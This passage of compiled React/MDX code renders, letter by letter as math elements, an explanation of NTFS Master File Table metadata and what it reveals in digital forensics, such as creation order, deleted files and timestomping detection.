                  children: "f"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "o"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "v"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "y"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "f"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "l"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "a"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "d"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "f"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "o"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "l"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "d"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "o"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "h"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "v"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "o"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "l"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "u"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "m"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  mathvariant: "normal",
                  children: "."
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "E"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "a"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "c"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "h"
                }), (0,jsx_runtime.jsx)(_components.mn, {
                  children: "1024"
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  children: "−"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "b"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "y"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "y"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "c"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "o"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "a"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "s"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "m"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "a"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "d"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "a"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "a"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "c"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "l"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "u"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "d"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "g"
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  children: ":"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "m"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "s"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "a"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "m"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "p"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "s"
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  stretchy: "false",
                  children: "("
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "c"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "a"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "d"
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  separator: "true",
                  children: ","
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "m"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "o"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "d"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "f"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "d"
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  separator: "true",
                  children: ","
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "a"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "c"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "c"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "s"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "s"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "d"
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  separator: "true",
                  children: ","
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "M"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "F"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "T"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "m"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "o"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "d"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "f"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "d"
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  stretchy: "false",
                  children: ")"
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  separator: "true",
                  children: ","
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "f"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "l"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "p"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "m"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "s"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "s"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "o"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "s"
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  separator: "true",
                  children: ","
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "s"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "c"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "u"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "y"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "d"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "s"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "c"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "p"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "o"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "s"
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  separator: "true",
                  children: ","
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "f"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "l"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "s"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "z"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  separator: "true",
                  children: ","
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "a"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "d"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "d"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "a"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "a"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "l"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "o"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "c"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "a"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "o"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  mathvariant: "normal",
                  children: "."
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "F"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "o"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "m"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "a"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "f"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "o"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "s"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "c"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "p"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "s"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "p"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "c"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "v"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  separator: "true",
                  children: ","
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "h"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "M"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "F"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "T"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "v"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "a"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "l"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "s"
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  children: ":"
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  stretchy: "false",
                  children: "("
                }), (0,jsx_runtime.jsx)(_components.mn, {
                  children: "1"
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  stretchy: "false",
                  children: ")"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "f"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "l"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "c"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "a"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "o"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "o"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "d"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  stretchy: "false",
                  children: "("
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "s"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "a"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "a"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "l"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "l"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "o"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "c"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "a"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "d"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "s"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "q"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "u"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "a"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "l"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "l"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "y"
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  children: "→"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "l"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "o"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "w"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "u"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "m"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "b"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "s"
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  children: "="
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "a"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "l"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "c"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "a"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "d"
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  stretchy: "false",
                  children: ")"
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  separator: "true",
                  children: ","
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  stretchy: "false",
                  children: "("
                }), (0,jsx_runtime.jsx)(_components.mn, {
                  children: "2"
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  stretchy: "false",
                  children: ")"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "d"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "l"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "d"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "f"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "l"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "s"
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  stretchy: "false",
                  children: "("
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "s"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "m"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "a"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "k"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "d"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "w"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "h"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "f"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "l"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "a"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "g"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "s"
                }), (0,jsx_runtime.jsx)(_components.mn, {
                  children: "0"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "x"
                }), (0,jsx_runtime.jsx)(_components.mn, {
                  children: "00"
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  separator: "true",
                  children: ","
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "d"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "a"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "a"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "m"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "a"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "y"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "s"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "l"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "l"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "x"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "s"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "c"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "l"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "u"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "s"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "s"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "u"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "l"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "o"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "v"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "w"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  stretchy: "false",
                  children: ")"
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  separator: "true",
                  children: ","
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  stretchy: "false",
                  children: "("
                }), (0,jsx_runtime.jsx)(_components.mn, {
                  children: "3"
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  stretchy: "false",
                  children: ")"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "m"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "s"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "o"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "m"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "p"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "g"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "d"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "c"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "o"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  stretchy: "false",
                  children: "("
                })]
              }), (0,jsx_runtime.jsx)(_components.annotation, {
                encoding: "application/x-tex",
